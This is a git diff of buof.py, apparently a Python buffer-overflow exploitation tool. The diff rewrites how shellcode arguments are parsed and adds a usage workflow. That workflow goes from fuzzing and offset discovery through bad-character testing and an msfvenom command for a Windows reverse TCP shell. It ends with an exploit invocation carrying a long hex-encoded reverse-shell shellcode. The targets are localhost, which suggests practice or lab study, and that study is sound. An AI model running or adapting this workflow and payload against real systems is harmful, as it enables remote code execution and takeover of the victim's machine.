@@ -10,13 +10,6 @@ from string import digits, ascii_uppercase, ascii_lowercase
 
 
 """
-  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
-  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 300 --eipvalue 2cA3
-  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 300 --badchars "\x00\x0a\x0d"
-  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 300 --offset 68 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d" --shellcode "\xfe\xca\xfe\xca"
-  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 300 --offset 68 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d" --shellcode "fecafeca"
-
-
   a. fuzz and find buffer overflow size:
     python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
     python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p
@@ -71,10 +64,11 @@ class BUOF:
     data = data.strip()
     if data.startswith("\\x"):
       return list(binascii.unhexlify(data.replace("\\x", "")))
-    elif re.search(r"^[a-zA-Z0-9]+$", data):
-      return list(map(ord, data.upper()))
     else:
-      return list(map(ord, data))
+      try:
+        return binascii.unhexlify(data)
+      except:
+        return list(map(ord, data))
 
   def hexdump(self, src, length=16, sep='.'):
     # https://gist.github.com/7h3rAm/5603718
@@ -240,3 +234,10 @@ if __name__ == "__main__":
   parser.add_argument('--trailer', required=False, default="", action='store')
 
   main(parser.parse_args())
+
+  ## usage/workflow:
+  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
+  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 300 --eipvalue 2cA3
+  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 300 --badchars "\x00\x0a\x0d"
+  ## msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7331 -b "\x00\x0a\x0d" EXITFUNC=thread -a x86 --platform Windows -f hex
+  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 1000 --offset 200 --jmpesp "cafecafe" --header "GET " --trailer "0a0d" --shellcode "bfa4c1d25ddbd4d97424f45d33c9b152317d1283c50403d9cf30a8dd3836531db957ddf88857b989bb67c9df37039fcbcc6108fc65cf6e33757c5252f57f87b4c44fdab501ad17e7dab98a176ef7169c3c191f41f4180ed48e4290d743ff99cf803a536472b062ac4a39c89162c810d64533672eb6ce70f5c414f4ed6fdeaec98e33289a9df83ec481ff937fbd7412af37ce316b1394582af97b642ca224c0274f30796a18f5b094d891c3e7ea3e786f47b6a668a8ed1fe6570e602f9c5a304735e3db97ba364bc714e92cb7d459c5ddda86f5de30af9c25d3af602522386325381beac32a4bbb5cc3f2e61672fa3c53b470b3a47b71beb6ec71f5e4bb8e2380201ca8502e3d670767f37ecd95aa28f3672a12b7b38f9d3631abb9288f34861c5f6350ca19dd12a4f3b2fc2085f83e368ad4c8d63b818ce9f4451992e8f5e649a916055bc4be900e65a322e5aadaa00f5319b87a56657e972af6eb9799f739"
